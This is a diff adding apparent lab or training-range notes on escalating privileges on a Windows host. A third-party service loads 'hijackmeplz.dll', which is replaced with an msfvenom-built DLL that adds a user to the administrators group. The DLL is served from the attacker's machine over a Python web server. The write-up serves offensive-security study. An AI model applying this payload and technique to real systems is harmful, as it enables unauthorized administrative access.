@@ -412,5 +412,41 @@ PSP: unknown
 Malware: unknown
 Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
 
+
+
+
+
+
+
+
+
+
+
+First go into services and find the MemoryStatus service, which has an empty description (indicates thrid party). third party means vulnerable!
+
+looking into the MemoryStatus file location shows you there is a C source code file, a services.exe application, and a text file that it dumps into. examining the source code shows you that it uses a "hijackmeplz.dll" dll, meaning it is vulnerable to DLL hijacking.
+
+create a malicious DLL with the same name as "hijackmeplz.dll" that adds your user to the administrators group.
+
+	msfvenom -p windows/exec CMD="cmd /C net localgroup administrators comrade /add" -f dll > hijackmeplz.dll
+
+^	adds your user to the administrator group, packs it into the dll loaded by the C source code.
+
+transfer your dll over to the box by opening a python3 web server while in the directory containing your msfvenom packed dll.
+
+	linops >> python3 -m http.server
+
+then go to the web server by opening it in your browser (in this case microsoft edge). type into the address bar your linux_float_ip:8000 to grab and download the dll. save it into the memory status folder as hijackmeplz.dll
+	
+after reboot, allows you to open a command prompt and runas administrator, whihc gives you access to see the admins desktop
+
+
+
+
+
+
+
+
+
 ```
 
